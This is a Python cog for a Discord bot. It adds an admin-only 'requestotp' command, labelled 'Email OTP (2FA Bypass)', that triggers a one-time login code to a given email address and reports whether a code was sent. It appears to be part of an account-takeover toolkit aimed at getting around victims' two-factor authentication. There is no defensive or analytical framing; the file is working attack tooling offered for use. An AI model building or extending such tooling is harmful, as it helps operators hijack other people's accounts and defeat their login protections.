from discord import app_commands
from discord.ext import commands
import discord

from views.utils.sendAuth import sendAuth

class requestOTP(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="requestotp", description="Email OTP (2FA Bypass)")
    async def requestotp(self, interaction: discord.Interaction, email: str):

        if interaction.user.id not in self.bot.admins:
            await interaction.response.send_message("You do not have permission to execute this command!", ephemeral=True)
            return

        response = await sendAuth(email)
        
        if "OtcLoginEligibleProofs" in response["Credentials"]:

            for value in response["Credentials"]["OtcLoginEligibleProofs"]:
                if value["otcSent"]:
                    await interaction.response.send_message(f"Sucessfully sent OTP to `{value["display"]}`", ephemeral=True)
                    return
            
        await interaction.response.send_message(f"Failed to sent OTP to this email...", ephemeral=True)

async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(requestOTP(bot))
